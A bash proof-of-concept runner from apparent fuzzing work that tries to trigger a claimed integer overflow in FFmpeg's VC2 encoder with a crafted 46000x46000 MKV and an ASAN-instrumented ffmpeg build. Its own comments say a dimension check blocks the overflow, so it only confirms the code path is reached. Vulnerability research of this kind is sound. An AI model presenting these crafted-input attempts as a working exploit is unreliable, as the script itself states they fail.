#!/bin/bash
# PoC runner for VULN 001: Integer Overflow in VC2 Encoder DWT Buffer Allocation
# File: libavcodec/vc2enc_dwt.c, Function: ff_vc2enc_init_transforms(), Line: 266
#
# KNOWN CONSTRAINT: The vulnerability is guarded by av_image_check_size2 in
# ff_set_dimensions() which uses pix_fmt=NONE (stride=8*w). This makes the
# guard ~8x more restrictive than needed, blocking the overflow-triggering
# dimensions from reaching ff_vc2enc_init_transforms() via the CLI.
#
# This script attempts TWO approaches:
#   A) MKV-based (original approach, expected to fail at dimension check)
#   B) lavfi-based at max valid dimensions (~16200x16200, no overflow but
#      exercises the vc2enc code path to confirm the encoder IS reachable)
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "======================================================================" | tee -a vuln_001_result.txt
echo "VULN 001 PoC: vc2enc_dwt.c:266 integer overflow attempt" | tee -a vuln_001_result.txt
echo "======================================================================" | tee -a vuln_001_result.txt

# --- Approach A: MKV-based (46000x46000 to trigger guard / document behavior) ---
echo "" | tee -a vuln_001_result.txt
echo "[A] Generating crafted MKV (46000x46000 V_UNCOMPRESSED/YV12)..." | tee -a vuln_001_result.txt
python3 vuln_001_gen.py 2>&1 | tee -a vuln_001_result.txt

echo "" | tee -a vuln_001_result.txt
echo "[A] Running ffmpeg -c:v vc2 on crafted MKV (expect dimension rejection)..." | tee -a vuln_001_result.txt
ASAN_OPTIONS="abort_on_error=0:log_path=${SCRIPT_DIR}/asan_mkv.log" \
  "$BIN" -y \
    -i vuln_001_input.mkv \
    -c:v vc2 \
    -slice_width 1024 \
    -slice_height 1024 \
    -f null - >> vuln_001_result.txt 2>&1 || true
cat "${SCRIPT_DIR}"/asan_mkv.log.* >> vuln_001_result.txt 2>/dev/null || true

# --- Approach B: lavfi-based at maximum valid dimensions ---
# 16200x16200 yuv420p passes av_image_check_size2 (stride=16200+1024=17224,
# 17224*(16200+128)=281106272 < INT_MAX) even with pix_fmt=NONE.
# The vc2enc overflow would need ~46340x46340, so no crash here, but this
# confirms the encoder initializes and exercises the vc2enc DWT path.
echo "" | tee -a vuln_001_result.txt
echo "[B] Running ffmpeg with lavfi nullsrc at 16200x16200 (max valid, exercises vc2enc)..." | tee -a vuln_001_result.txt
ASAN_OPTIONS="abort_on_error=0:log_path=${SCRIPT_DIR}/asan_lavfi.log" \
  "$BIN" -y \
    -f lavfi \
    -i "nullsrc=size=16200x16200:rate=1:duration=0.1" \
    -c:v vc2 \
    -slice_width 1024 \
    -slice_height 1024 \
    -frames:v 1 \
    -f null - >> vuln_001_result.txt 2>&1 || true
cat "${SCRIPT_DIR}"/asan_lavfi.log.* >> vuln_001_result.txt 2>/dev/null || true

echo "" | tee -a vuln_001_result.txt
echo "[*] Done. See vuln_001_result.txt for full output." | tee -a vuln_001_result.txt
